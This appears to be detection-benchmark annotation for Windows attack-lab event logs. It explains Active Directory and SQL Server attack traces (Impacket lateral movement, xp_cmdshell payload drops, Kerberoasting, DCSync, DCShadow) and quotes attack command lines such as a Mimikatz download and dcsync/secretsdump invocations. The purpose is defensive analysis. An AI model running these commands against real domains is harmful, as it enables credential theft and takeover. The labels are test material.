attack_commands: Login failed for user 'sa'. Reason: An error occurred while evaluating the password. [CLIENT: 10.23.23.9]

malicious_events: 2 × Event 33205 (SQL audit, action_id=LGIF login fail): login attempts for `sa` from CLIENT 10.23.23.9 to MSSQL01\RADAR. Reason: 'An error occurred while evaluating the password.' — that wording (vs. the more common 'Password did not match…') indicates the SA login is *disabled*; SQL refuses the password check entirely. T1110.001 Password Guessing aimed at the disabled SA: the attacker is probing whether SA is currently enabled, which is a precondition for the file 50 `ALTER LOGIN [sa] ENABLE` re-activation step.

label_review.reason: In-artifact intent audit 2026-06-12: 2x 33205 failed login against a DISABLED SA account — 2 attempts is noise, not credential guessing (mirrors the 4625 2-failure relabel). No in-artifact attack intent.

v3 audit borderline review: 2x 4625 LogonType 10 (RDP) Status 0xC000006E from 10.23.23.9, no success. Two failed logons is not, in-artifact, a brute-force; the prior YES rested on 10.23.23.9 being a known-attacker host across the corpus — cross-file attribution the per-artifact benchmark does not expose (same basis on which ID4825 was relabeled benign).

malicious_events: Event 1 (Sysmon): cmd.exe spawned by SYSTEM with parent command `cmd /Q /c echo cd > \\127.0.0.1\C$\__output 2>&1 > execute.bat & cmd /Q /c execute.bat & del execute.bat` — classic Impacket wmiexec pattern (write batch, run it, capture output to ADMIN share, delete) for remote command execution (T1047 Windows Management Instrumentation)

2 × Event 7 (Sysmon ImageLoad, RuleName=T1086): powershell.exe loaded `System.Management.Automation.ni.dll` — confirms PowerShell scripting engine is in use (CrackMapExec / Invoke-Mimikatz prerequisite)

2 × Event 3 (Sysmon NetworkConnect): powershell.exe initiated TCP 10.23.42.38:62095 → 10.23.123.11:443 — outbound HTTPS connection to attacker C2 (10.23.123.11 is the consistent OFFSEC-lab attacker IP across this corpus)

Event 10 (Sysmon ProcessAccess): powershell.exe → lsass.exe with GrantedAccess 0x143A (PROCESS_QUERY_INFORMATION + VM_READ + ...). CallTrace ends in `UNKNOWN(...)` indicating shellcode/in-memory module — the canonical Invoke-Mimikatz / CrackMapExec mimikatz LSASS-access fingerprint (T1003.001 LSASS Memory).

1023-event WMIexec lateral pattern on FS03VULN: 960 × Event 5145 (Network Share access via SMB) targeting admin shares `\\*\ADMIN$` / `\\*\C$` / `\\*\IPC$` from attacker IPs 10.23.23.9, 10.23.123.11, plus loopback 127.0.0.1.

Event 4688: `cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619090610.0007844 2>&1` — Impacket wmiexec.py's signature command with timestamp-suffixed output file (`__<unix-timestamp>` random-tag) on the loopback ADMIN$ share. Same pattern as file 19 but at scale.
15 × Event 4624 + 4672 + 4964 (privileged logons) — repeated remote-cmd invocations.
11 × Event 5140 (network share connections), 2 × Event 4674 (privileged object operations).
Event 1102 (Security log cleared) — anti-forensics finalization. **Removed** `\Device\ConDrv` from registry (kernel device path, not regkey).

Event 4688: `schtasks.exe /create /sc minute /mo 1 /tn eviltask /tr C:\tools\shell.cmd /ru SYSTEM` — creates scheduled task named `eviltask` that runs `C:\tools\shell.cmd` every 1 minute as SYSTEM. T1053.005 Scheduled Task/Job: Scheduled Task — high-frequency SYSTEM-context callback gives the attacker recurrent SYSTEM execution and survives reboots.
Event 4698 (Scheduled Task Created) confirms `\eviltask` registered.

Event 4688 of `cscript.exe /nologo MonitorKnowledgeDiscovery.vbs` ⇒ DCOM activation context (parent SRVDEFENDER01$ machine account) on the target — same MMC `-Embedding` pattern as files 67/100. Net pattern: lateral movement landed via DCOM, then dropped a SYSTEM scheduled task for persistence.

Event 4688: `at 13:20 /interactive cmd` — admmig schedules an interactive cmd.exe via the legacy AT scheduler service. T1053.002 At (Windows Job): the AT scheduler runs jobs in the SYSTEM context by default, so /interactive cmd produces a SYSTEM-tier interactive shell on the desktop at 13:20 — a classic LPE / persistence trick that long predates schtasks.
AT was deprecated in Windows 8 / Server 2012 and removed in Windows 10 1709+ — its mere presence in 4688 traces on a modern host is an IoC.

Event 4688: `schtasks /create /s fs02 /tn tasks_test_hacker2 /tr myapp.exe /sc daily /mo 10` — lambda-user (canary/honeypot account) creates a REMOTE scheduled task on fs02 that runs `myapp.exe` daily every 10 days. T1053.005 Scheduled Task / Job (remote): persistence + lateral movement combined — the task lands on fs02 and re-launches the payload there, while its name (`tasks_test_hacker2`) and target binary (`myapp.exe`) are not legitimate.

lambda-user is a canary in this lab — any 4688 with that subject is high-confidence attacker activity by definition; the /s fs02 syntax confirms the target host is remote (RPC over SMB to atsvc/Schedule).

malicious_events: Event 4698 (Scheduled task created): admmig registers a task with random 8-char name `\bouWFQYO`, RunLevel `HighestAvailable`, Hidden=true, RunAs `S-1-5-18` (LocalSystem), action = `cmd.exe /C whoami > %windir%\Temp\bouWFQYO.tmp 2>&1`. T1053.005 Scheduled Task — but the Impacket atexec.py signature: random 8-char task name + matching .tmp output filename + Hidden=true + redirect to %windir%\Temp. (illustrative invocation — the literal command line is not in the events).

Event 4699 (Scheduled task deleted): same task `\bouWFQYO` is REMOVED seconds after creation — atexec creates the task, the scheduler runs it, atexec reads the .tmp output back over SMB, then atexec deletes the task to leave no on-disk trace.
The 4698→4699 fast-pair on a single task with random-8-char name is a near-zero-FP IoC for Impacket atexec.py lateral movement; legitimate admin tasks are not created+deleted within seconds.
RunLevel HighestAvailable + LocalSystem principal makes this a SYSTEM-tier RCE primitive triggered remotely over RPC.

Event 4698 (Scheduled task created): admmig registers a task whose action is `C:\WINDOWS\Temp\MpCmdRun.bat` — the .bat masquerades as the legitimate Microsoft Defender CLI helper but lives in C:\WINDOWS\Temp (Defender's real MpCmdRun.exe is in C:\Program Files\Windows Defender or C:\ProgramData\Microsoft\Windows Defender\Platform\<ver>). T1036.005 Match Legitimate Name: classic SMBexec masquerade.

Event 4699 (Scheduled task deleted): the task is removed seconds later — same fast-pair pattern as atexec.py but driven through the SMB scheduler-RPC backend (Impacket smbexec.py uses task-scheduler RPCs over SMB).
Author=`OFFSEC\lambda-user` in the task XML — lambda-user is the canary/honeypot account, so the task creation is by definition attacker-driven.
RunAs `S-1-5-18` (LocalSystem) makes the .bat run with SYSTEM privileges; combined with the Defender-name masquerade, the trace looks innocuous to a hurried analyst.

Event 5145: SMB access to `\\*\IPC$` with RelativeTargetName=`atsvc` from `10.23.123.11`. The `atsvc` named pipe is the AT/Schedule RPC binding — Impacket atexec.py uses `ITaskSchedulerService` over `\PIPE\atsvc` to remotely create scheduled tasks without dropping schtasks.exe on the target.

Event 5145: SMB access to ADMIN$ targeting `Temp\bouWFQYO.tmp` — atexec.py's standard output-collection path: the scheduled task writes its stdout to `%windir%\Temp\<random8>.tmp`, then atexec.py reads the .tmp back over SMB.

Companion to file 156 (`ID4698-4699-Fast created & deleted task by ATexec (susp. arg.).evtx`): the 4698/4699 captures task create+delete; this 5145 captures the SMB transport layer of the same atexec session.

T1053.005 Scheduled Task / Job + T1021.002 SMB shares — atexec.py is the CHOSEN flavor of Impacket because it leaves no service-install artifact (PSEXESVC) and no lingering scheduled task (delete-after-execute).

malicious_events: Event 4688 (×~138): sqlservr.exe parent → many `cmd.exe /c echo <base64>>>%TEMP%\feyQV.b64` calls — Svc-SQL-DB01 (the SQL service account) writes a Base64 payload to disk in segments, the standard xp_cmdshell-driven file-drop pattern when no other write primitive is available. T1190 Exploit Public-Facing Application + T1059.003 Windows Command Shell via xp_cmdshell.

The chunked base64 starts with 'TVqQAAMA' (= MZ header) — the file being staged is a Windows PE (executable / DLL), not text. Decoded length is consistent with Metasploit reflective-DLL or Meterpreter staged binary.

Event 4688: `cscript //nologo C:\Users\SVC-SQ~1\AppData\Local\Temp\UbdXv.vbs` — VBS decoder/dropper that turns the .b64 fragments back into the PE binary `TVupu.exe` (random 5-char executable name in the SQL service account's TEMP).

Event 4688: `"C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe"` — the dropped binary is then executed under the SQL service account's context (LocalSystem-equivalent on default MSSQL installs), giving the attacker SYSTEM-tier control. Classic MSF exec-payload chain.

Event 4688: `"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip` invoked by admmig — Microsoft Edge launched from command line directly downloading the Mimikatz release ZIP from the gentilkiwi GitHub releases page (T1105 Ingress Tool Transfer using a non-typical browser-launched-from-cmd vector that may evade tool-blocked download monitors).
Event 4688 of `taskkill /IM msedge.exe /F` + `timeout 3` — kills Edge after the download to clean up the residual browser process so it doesn't show in the user's open-window list.

Companion 4688 events of msedge.exe crashpad-handler / SecurityHealthHost.exe / WIN10-02$ machine context confirm the host (no remote-WMI invocation here — it ran locally on WIN10-02 as admmig). T1105 + T1218 (signed-Edge as proxy).

Event 5145 (×2): admmig from `10.23.123.11` accesses IPC$\svcctl (Service Control Manager RPC pipe) and ADMIN$\System32\WindowsPowerShell\v1.0\powershell.exe (powershell.exe binary path on the target). T1543.003 + T1021.002: classic remote service creation pattern.

Pairing pattern: open IPC$\svcctl (to issue CreateServiceW), then read powershell.exe from ADMIN$ (to verify the binary is present at the path that will be set as binPath). After this 5145 pair the typical follow-on is a 4697 (service installed) on the target host with binPath pointing to powershell.exe + an attacker-supplied -EncodedCommand argument.

Companion to the 4688/4697 server-side files for PsExec/Impacket psexec.py — those capture the service install + child PowerShell process; this 5145 captures the SMB-transport-side observation of the same remote-service-creation primitive.

Event 5145 (×246, network share access on IPC$\svcctl): admmig from 10.23.23.9 hammers the SCM RPC binding 246 times in succession. T1543.003 Create or Modify System Process: Windows Service — the network-side observation of Tchopper's covert-channel service-plant phase.

Tchopper signature: the tool creates one fake service per chunk of an exfil payload (chunk encoded as the service DisplayName). Each CreateService call generates one 5145 against IPC$ svcctl named pipe — 246 events == 246 services planted in one session, far above any legitimate use case.

Companion to file 139 (`ID4688-Obfuscated payload transfer via service name - Tchopper.evtx`): that file captures the LATER reassembly stage (Get-Service segN | DisplayName | Out-File loop, 735 events); this 5145 file captures the INITIAL plant stage (the 246 service-create RPCs that load the chunks into the SCM database).
246 services-created-in-seconds is the smoking gun — a chunk count above ~100 from one source IP within minutes is automation, not human admin work.

Event 7045 (~700, service installed): admmig installs ~700 fake services back-to-back, each with a chunk of base64-encoded payload as the service DisplayName. T1543.003 + T1132 Data Encoding: this is the SETUP stage of the Tchopper covert-channel - the attacker shreds an exfil payload (PowerShell EPS-monitoring script in this trace) into ~700 chunks of base64, plants each chunk as a service DisplayName, then later (file 139) iterates Get-Service segN to reassemble the payload on the destination side.

Event 7000 (service failed to start) + Event 7009 (service start timeout): the planted services are not real services - they have fake binPaths or no binPath at all - so the SCM tries to start them and they fail. The attacker does not care; the service registration itself (with the DisplayName carrying the chunk) is the goal.
Event 7036 (service entered the running/stopped state): companion to the failed-start records.

Tchopper signature: hundreds of services planted in seconds, each with a base64 fragment in its DisplayName. The payload reconstructs to a PowerShell EPS (events-per-second) measurement script (Get-WinEvent -ListLog, AvgEventsPerSecond, WinCollect Default strings visible in some chunks) - likely a recon/sizing script for SIEM-collection bypass.

Companion to file 139 (ID4688-Obfuscated payload transfer via service name - Tchopper.evtx) and the 5145-svcctl Tchopper file: three observability layers (SCM-side 7045, cmd-side 4688 reassembly, SMB-side 5145) of the same Tchopper covert-channel attack.

Event 7009 (×3, A timeout was reached while waiting for the service to connect): the SCM tried to start a service that never reported back as 'started' within the 30-second timeout. Classic Metasploit Meterpreter service-stager fingerprint.

Why this happens with MSF: Metasploit's `psexec` and `psexec_psh` modules upload a service binary that, instead of running an SCM-aware long-running service, just spawns a Meterpreter reverse-shell process and exits. The SCM expects a service binary to call `SetServiceStatus(SERVICE_RUNNING)` within 30 seconds — Meterpreter doesn't, so the SCM eventually fires 7009 with the timeout error.

T1543.003 + T1059 — service-create lateral movement where the binary doesn't pretend to be a real service. Detection: any 7009 event correlated with a recent 4697/7045 service-install from a non-trusted source is high-confidence Meterpreter / Cobalt Strike `psexec` payload.
3 successive 7009s suggest the attacker retried the lateral chain three times or installed three concurrent service stagers — both anomalous patterns.

Event 33205 (SQL audit) by OFFSEC\admmig: `ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]` on MSSQL01\RADAR — added the rogue `test-sql` login to the highest-privilege server role `sysadmin`. Final escalation step: `test-sql` is now equivalent to the original `sa` and can do anything (T1078.003 Local Accounts persistence + T1098 Account Manipulation). Combined with files 58 (login created) and 59 (db_accessadmin grant), this is the standard 3-step SQL persistence playbook — and the absence of any remote CLIENT IP indicates the attacker already had a session on the host (post-exploitation, not initial probe).

label_review.reason: CREATE USER FOR LOGIN is routine DBA boilerplate with no privilege escalation; maliciousness lived only in the unseen 58-60 chain. Tier-1 review 2026-06-04: relabeled benign, kept in corpus.

malicious_events: Event 4688: `SetSPN -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1` — lambda-user (canary) ASSIGNS a synthetic MSSQL SPN to the honey-pot1 user. T1558.003 Kerberoasting prep / T1098 Account Manipulation: any account with a SPN can be roasted (TGS-REP service ticket pulled and offline-cracked); attackers add their own SPN onto a writable target user when no organic service accounts have crackable hashes.

Event 4688: `setspn -T offsec -Q */*` enumerates EVERY SPN in the domain — paired with -a, this is the standard add+verify cycle (write the SPN, then re-query the forest to confirm propagation across DCs).

lambda-user is a canary in this lab — any 4688 with that subject is high-confidence attacker activity by definition. The combo `setspn -a` + canary subject is a near-zero-FP IoC for active SPN tampering.

Event 4724 (password RESET — by admin) on `hacker2` by admmig — Mimikatz `lsadump::setntlm` invocation: privileged SAMRPC `SamrSetInformationUser2` (level 26 / `UserInternal4InformationNew`) write that overwrites the target's NT hash directly with an attacker-supplied value. Does NOT require knowledge of the existing password — just SAM-write rights. T1098 Account Manipulation. (Mimikatz subcommand syntax — analyst shorthand for the technique; not literally logged).
Event 4738 (account-info changed) is the LSA-side companion confirming SAM record was modified.

Event 5145 with ShareName=`\\*\IPC$` and RelativeTargetName=`samr` from 10.23.23.9 — confirms the SAMRPC call was driven over SMB→IPC$→\PIPE\samr from the attacker host. The `samr` named pipe is the SAMRPC transport.
Event 4624 (logon) by ROOTDC1$ from fe80::1cae… (IPv6 link-local) is the DC-side authentication that preceded the samr write — admmig authenticated to ROOTDC1 via SMB over IPv6.

Companion to file `ID4723-5145-password reset with changeNTLM (Mimikatz).evtx`: same goal (overwrite hacker2's NT hash) but via the privileged set path instead of the caller-knows-old change path. Both are Mimikatz lsadump:: subcommands.

Event 4728 (member added to security-enabled GLOBAL group): lambda-user (canary subject) adds `honey-pot1` (CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan) to `Domain Admins`. T1098 Account Manipulation + T1078.002 Valid Accounts: Domain Accounts. Domain Admins is the highest-tier domain group; ANY membership change is a Tier-0 privilege event.

Event 4738 (account info changed): admmig modifies hack1's userAccountControl to FLIP `NOT_DELEGATED` (bit 0x100000 / decimal 1048576) — the 'Account is sensitive and cannot be delegated' checkbox in ADUC.

T1098 Account Manipulation: clearing this flag (or setting it for an attacker plant) directly affects the account's Kerberos delegation eligibility. Setting it on a high-priv account is actually a defensive move in legitimate ops; clearing it ENABLES that account to be delegated to via S4U2Self/S4U2Proxy / RBCD — the standard delegation-abuse chain.
When attackers flip THIS specific bit, it's part of a constrained-delegation or RBCD setup: the target account must be delegatable, so the NOT_DELEGATED flag must NOT be set.

Tactic 4738 events have no human-readable per-attribute change in the Win evtx schema — the change is encoded as a userAccountControl decimal value diff that requires bit-mask interpretation (e.g. 0x100000 = NOT_DELEGATED, 0x10000 = DONT_EXPIRE_PASSWORD, 0x20 = PASSWD_NOTREQD).

malicious_events: Event 4738 (account info changed): admmig sets the `PASSWD_NOTREQD` flag (UAC bit 0x20 / decimal 32) on `hack1`. T1098 Account Manipulation — the user can now have an empty password.

Empty-password accounts are direct backdoor primitives: an attacker can set the password to '' via `net user hack1 "" /domain` (or wmic ldap update) and then authenticate as hack1 from any workstation without supplying any secret. SMB/RDP/Kerberos all accept an empty NT hash in this state.

PASSWD_NOTREQD is one of the highest-signal attacker-tampering UAC bits — it has almost no legitimate use case in a hardened domain (a few service accounts on legacy NAS appliances are the only common exception).
Event 4738 (account info changed): admmig sets the `DONT_REQUIRE_PREAUTH` flag (UAC bit 0x400000 / decimal 4194304) on `hack1`. T1558.004 Steal or Forge Kerberos Tickets: AS-REP Roasting prep.

When DONT_REQUIRE_PREAUTH is set, any unauthenticated requestor can ask the KDC for a TGT for hack1 — the response (AS-REP) is encrypted with hack1's NT hash. Attackers harvest AS-REPs offline with `Rubeus asreproast` or `GetNPUsers.py` (Impacket) and crack them with hashcat (-m 18200) at GPU-friendly rates.
This flag has essentially zero legitimate use cases in a healthy domain — DONT_REQUIRE_PREAUTH is a near-zero-FP IoC for Kerberos-roastable persistence plants.

Event 4738 (account info changed): admmig sets the `PASSWORD_CANNOT_CHANGE` flag (UAC bit 0x40 / decimal 64) on `hack1`. T1098 Account Manipulation — the account's owner is now blocked from changing the password.

Persistence primitive: the attacker has set the password (presumably to one they know), and now locks it so the legitimate user cannot rotate it away from the attacker-known value. The user can still authenticate, but cannot displace the attacker's stored credential.

Combined with DONT_EXPIRE_PASSWORD (file `Password never expires`) the flag pair makes the credential effectively immortal: the user can't change it AND the system never forces a change. Together they pin the credential indefinitely.

malicious_events: Event 4738 (account info changed): admmig sets `USE_DES_KEY_ONLY` (UAC bit 0x200000 / decimal 2097152) on `hack1` — the account's Kerberos tickets will now be encrypted with DES only (DES-CBC-MD5/DES-CBC-CRC).

T1558.003 Kerberoasting downgrade: DES is broken (56-bit key, GPU-crackable in seconds). When attackers KERBEROAST `hack1`, the TGS-REP comes back DES-encrypted instead of AES-256, slashing offline-crack time from hours/days to seconds.

DES is disabled by default in modern Windows (since Windows 7 / Server 2008 R2). Setting USE_DES_KEY_ONLY on an account is essentially never legitimate in a 2026 environment — almost zero-FP IoC for Kerberos crypto downgrade attacks.
Setting this flag also drops the account from msDS-SupportedEncryptionTypes for AES, so any existing AES Kerberos sessions silently switch to DES.

Event 4738 (account info changed): admmig sets `ENCRYPTED_TEXT_PWD_ALLOWED` (UAC bit 0x80 / decimal 128) — the 'Store password using reversible encryption' option — on `hack1`. T1098 Account Manipulation + T1003 Credential Access prep.

When this flag is set AND the user subsequently changes their password, AD stores the cleartext password (encrypted with the syskey, but recoverable via DCSync's `lsadump::dcsync` or `lsadump::lsa /patch`) instead of only the NT/LM hashes. Mimikatz `lsadump::dcsync /user:hack1` will return the cleartext directly.

This flag is set by default on no normal account; legitimate use cases are obsolete (CHAP/SHIVA dial-up, MS-CHAPv1) and should not exist in any modern domain. Near-zero-FP IoC for cleartext-credential persistence/exfil prep.
Note: the cleartext is only stored AFTER the next password change — so attackers typically pair this 4738 with a 4724 (forced password reset) to immediately populate the reversible-encrypted blob.

When a host is TRUSTED_FOR_DELEGATION, ANY user that authenticates to it (even via SMB) leaves a forwarded TGT cached on it — Mimikatz `sekurlsa::tickets /export` extracts those TGTs, and the attacker can then impersonate the original user against any service in the forest. If a Domain Admin ever connects to MYTARGET-PC (even briefly), their TGT is harvestable.

The `any protocol` (protocol-transition) variant is the more dangerous form — without protocol transition, S4U2Self requires the target user to have authenticated to the relaying host first; with it, the relaying host can mint tickets for arbitrary users on demand.

Once written, the listed account can call S4U2Self → S4U2Proxy and impersonate Domain Admins to TARGET01.
Event 4742 (computer account changed): companion event recording the same change at the SAM-record layer (4742 is the high-level wrapper, 5136 is the per-attribute write).

Detection: ANY write to msDS-AllowedToActOnBehalfOfOtherIdentity should be a near-zero-FP IoC — the attribute is rarely set in legitimate environments (only by admins explicitly configuring delegated services), and writing it requires GenericWrite/WriteDACL on the target object, which Mimikatz/Rubeus tooling exploits via captured machine-account credentials.

Often paired with attacker-created machine account (file `ID4741-Computer account created with privileges.evtx`) as the SourceComputer in the RBCD ACL — the chain is: create machine account → set its password to a known value → add it to TARGET's RBCD list → S4U-impersonate-DA-against-TARGET.

Persistence primitive: an admin-named account is less likely to be queried/deleted during routine cleanup and may slip past account-pruning scripts that whitelist anything matching `admin-*`.

Event 4720 (account created) by lambda-user (canary) for a USER object named `FAKE-COMPUTER$`. T1136 Create Account + T1036 Masquerading — the trailing `$` mimics a Windows machine-account naming convention (every domain-joined computer has a SAM account ending in `$`). This is a USER-class object made to look like a COMPUTER-class object.

Common purposes: (1) hide a backdoor account in the user list because admins routinely filter `net user` output to skip `*$` machine accounts; (2) stage for noPac/CVE-2021-42278 (machine-account rename to remove the trailing $ then claim DC identity); (3) carry a rogue SPN that would normally only be expected on machine accounts.

lambda-user is a canary — any 4720 with that subject is high-confidence attacker activity by definition. The combination canary-subject + machine-account-style name is a deliberate persistence + privilege-confusion plant.

Local-account persistence beats domain-account persistence because (a) it survives loss of domain trust / domain disjoin, (b) it does not appear in domain-side audit feeds, (c) it can be used for SMB/RDP authentication via NTLM-only, bypassing Kerberos-centric detection.

Event 11 (Sysmon FileCreate): notepad++.exe modified `E:\Exchange2016\TransportRoles\Shared\agents.config` on exchange01.offsec.lan — Exchange transport-agent registration file is a known persistence/intercept vector (Mailbox-server backdoor, T1546 / T1556.x). Event 6 (×4, MSExchange Common: Transport Agent installation failed): four successive failed attempts to install an Exchange Transport Agent on the Exchange server. T1505.002 Server Software Component: Transport Agent — a known Exchange-resident persistence mechanism.

Why Transport Agents matter: a Transport Agent is a managed-code DLL that registers with Exchange's mail-flow pipeline (via `Install-TransportAgent`) and gets called for every email passing through the server. Attackers use them to: (a) intercept and exfiltrate inbound/outbound email, (b) inject backdoor messages, (c) execute arbitrary code in the Exchange Server context (NetworkService or LocalSystem depending on Exchange version).

Four successive INSTALL FAILURES suggest the attacker is iterating the agent build (correcting binding errors, version mismatches, .NET runtime issues) — manual admins do not retry agent installs four times in one session.

Compromised Exchange administrators or compromised Exchange servers (post-ProxyShell / ProxyLogon) are the typical setup for a Transport Agent plant. The Event 6s here capture the failed installs; once the attacker fixes the agent build, the SUCCESSFUL install would generate a different event ID (5 / 7) that does not appear in this trace.

Event 17115 (MSSQL$RADAR provider): SQL Server instance `RADAR` on mssql01.offsec.lan started with command-line args `-s "RADAR" -m` — the `-m` flag forces single-user mode, which limits the instance to one connection AND grants any local administrator full sysadmin (sa) privileges, regardless of database security. Combined with T1505.001 SQL Stored Procedures persistence: an attacker with local-admin reboots SQL into single-user mode, connects as the implicit sysadmin, resets the real SA password (or installs a stored procedure for persistence), then restarts normally. The filename misspells the EID as 11715; the actual event is 17115.
Event 15457 (#1): SQL Server option `show advanced options` toggled 1→1 (no-op refresh; required precondition for advanced sp_configure changes).

Event 15457 (#2): SQL Server option `clr enabled` toggled 0→1. Enabling CLR (Common Language Runtime) integration lets a sysadmin-privileged session load custom .NET assemblies into the SQL Server process via `CREATE ASSEMBLY` — a powerful T1059/T1620 in-process code-execution path used for SQL→OS pivot, lateral movement, and post-exploitation tooling like SQLRecon.

Event 15457 (MSSQL$RADAR config-change): SQL Server option `xp_cmdshell` toggled from 0 → 1 (disabled → enabled). xp_cmdshell lets a sysadmin-privileged SQL session shell out to OS-level cmd.exe with the SQL service-account context — a primary T1059 SQL→OS command-execution path used after T1190 SQL injection or T1078 SQL credential abuse.

Event 33205 (SQL audit ALST): action by `OFFSEC\admmig` (database principal `dbo`) on server `MSSQL01\RADAR` database `master` with statement `RECONFIGURE;` — the verbatim SQL command that committed the xp_cmdshell change.

Event 4688: `net start MSSQL$RADAR /m` (with internal re-launch as `net1 start MSSQL$RADAR /m`) — admmig stops the standard SQL Server instance and re-starts it in SINGLE-USER mode (`/m` flag). T1003 Credential Access path: in single-user mode, ANY local administrator gets implicit `sysadmin` (sa) on the SQL instance, bypassing the normal SQL login authentication entirely.
Event 4688: sqlservr.exe parent → `"sqlservr.exe" -sRADAR` is the SQL Server worker re-launching under the new (single-user) startup parameter — confirmation the /m switch took effect.

Once in single-user, the next steps (typically via osql/sqlcmd from the same admin shell) are: read all sa/login password hashes, reset sa to a known value, re-enable xp_cmdshell, then restart the service back into multi-user mode — leaving a backdoor sa password and a reactivated xp_cmdshell exfil/exec primitive.

malicious_events: Event 4104 (ScriptBlock logging): a PowerShell pipeline using the Invoke-WmiMethod / Set-WmiInstance / [WmiClass]::StdRegProv.SetSecurityDescriptor() path to write a registry security descriptor REMOTELY against a domain target. T1546.012 IFEO / T1547 Boot or Logon Autostart + T1098 Account Manipulation via WMI registry-DACL write (DAMP — Discretionary ACL Modifying Persistence).

DAMP signature: write a permissive DACL onto sensitive HKLM\SAM keys (specifically HKLM\SAM\SAM\Domains\Account\Users) so that a low-priv user can later read NT hashes from SAM. The PS-via-WMI path is preferred over reg.exe because it avoids the 4688 reg.exe child-process record and the WMI-RPC traffic looks like routine WSUS/SCCM traffic on the wire.
Event 800 / 400 / 600: the standard PS-engine-startup envelope. Pipeline detail in 4104 reveals the StdRegProv.SetSecurityDescriptor invocation.

14 × Event 4662 with mixed subjects: `admmig` AND `ROOTDC1$`. Object GUIDs include `{832b1c45-2f6e-4c82-be40-d461e377f560}` — a control-access right associated with directory replication — accessed in the same window as other replication-class extended rights. The mix of an interactive user (admmig) and the DC's own machine account (ROOTDC1$) reading replication-class attributes is the DCShadow signature (T1207): Mimikatz `lsadump::dcshadow` registers admmig's host as a fake DC, then ROOTDC1$ accepts replication FROM the rogue DC, which is what generates the ROOTDC1$-context 4662 events. Pairs with file 89 + the 5137 file (#172 area). (Mimikatz subcommand syntax — analyst shorthand for the technique; not literally logged).

Event 5137 (Directory Service Object created): admmig creates a Server object `CN=JUMP01,CN=Servers,CN=OFFSEC-PREMISE,CN=Sites,CN=Configuration,DC=offsec,DC=lan`. T1207 Rogue Domain Controller (DCShadow): registering JUMP01 as a Server in the Configuration partition is one of the prerequisite steps for declaring a host as a replication endpoint.

DCShadow chain: (1) register Server object in CN=Sites (THIS event), (2) add NTDS Settings child object that lists JUMP01 as a replication-capable DC, (3) set the DC SPNs (`GC/...` + `E3514235-... DRSUAPI`) on JUMP01$ — file 190 / `ID4742-SPN set on computer account (DCshadow).evtx`, (4) push attribute changes via DRSUAPI replication that legitimate DCs accept and apply.

Once steps 1-3 are complete, the rogue DC can write any AD attribute and the change is persisted forest-wide because legitimate DCs trust the replication-source signature. Mimikatz `lsadump::dcshadow /push` automates the full chain. (Mimikatz subcommand syntax — analyst shorthand for the technique; not literally logged).
Companion to file 91 (4662 DCsync), file 93 (4662 sensitive attribs DCshadow), file 190 (4742 SPN set DCshadow). The 5137 here is the very FIRST step of the chain — the Server object plant.

Event 5136 (directory service object modified): SRVFS02$ (a SERVER MACHINE ACCOUNT, not a user) modifies the `nTSecurityDescriptor` on `OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan`. T1098 Account Manipulation via OU DACL.

Anomalous subject: machine accounts modifying OU DACLs is highly unusual — legitimate OU DACL changes are made by domain admins through ADUC or Group Policy. SRVFS02$ writing an OU's security descriptor implies the machine account has been compromised (likely RBCD-abuse where attacker controlled SRVFS02 and used its identity to perform the AD write).
Event 4662: companion event tracking the access to the GUID `{584f37e2-73c1-44f4-ab29-eb48dce59ed4}` extended right.

Adding ACEs to an OU like Test-OU grants the new ACL holder rights over EVERY object inside the OU (users, computers, sub-OUs) — a multiplier-effect persistence primitive. BloodHound `GenericWrite/WriteDACL on OU` outbound-ACL edges find these paths.

Event 5136 (×2, directory service object modified): admmig modifies the `nTSecurityDescriptor` on `OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan` — the user-driven variant (subject is a regular user account) of the same OU DACL edit captured in the machine-driven file `ID5136-Permission change on OU by computer.evtx`.
T1098 Account Manipulation via OU DACL: the same multiplier-effect primitive — adding an ACE to OU=Test-OU grants the holder rights over every object (users, computers, sub-OUs) inside.

User-driven OU DACL changes are LESS anomalous than machine-driven (admins do edit OU permissions occasionally), but a write that adds GenericAll/GenericWrite for a non-Tier-0 user account is still a BloodHound-flagged outbound-ACL primitive.

Companion to file `ID5136-Permission change on OU by computer.evtx`: same target, different actor — sequence may be deliberate for blame-attribution confusion (the attacker first writes via admmig, then via SRVFS02$, so post-incident the SOC isn't sure which account is the actual attacker).

Event 5136 (directory service object modified): the `nTSecurityDescriptor` on the DOMAIN ROOT (`DC=offsec,DC=lan`) is modified. T1098 Account Manipulation + T1003.006 DCSync prep — the highest-tier ACL change in the entire forest.

Event 4662 (×many) with control-access right GUIDs `{0b32719a-...}` (DS-Replication-Get-Changes) and `{832b1c45-...}` (DS-Replication-Get-Changes-All) confirms the change being granted is the DCSync replication rights themselves.

T1003.006 OS Credential Dumping: DCSync — granting these two extended rights to a non-DC account lets that account run `mimikatz lsadump::dcsync /all /csv` or `secretsdump.py -just-dc-ntlm` to pull EVERY NT hash in the domain (including krbtgt → forge Golden Tickets indefinitely). (illustrative invocation — the literal command line is not in the events).

ROOTDC1$ subject is expected (the DC machine account makes the actual attribute writes during replication); SRVFS02$ subject is the IoC — a non-DC server should not be modifying the domain root's nTSecurityDescriptor under any normal circumstance.
Combination of (a) target = DC=offsec,DC=lan (forest root), (b) replication-class extended right GUIDs, (c) non-DC machine account writing — near-zero-FP IoC for DCSync-rights persistence plant.

Event 5136 (directory service object modified): admmig modifies the `nTSecurityDescriptor` on the GPO container `cn={127328D6-A8A8-49E3-BA71-410C945F42CE},cn=policies,cn=system,DC=offsec,DC=lan`. T1098 + T1484.001 GPO Modification: granting DACL writes on a GPO lets the new ACE holder modify the GPO's contents at will.
Event 4662: companion event recording the access to extended right GUID `{244db979-f8ae-4695-9e37-2104a17a967f}` (used in GPO security descriptor manipulation tracking).

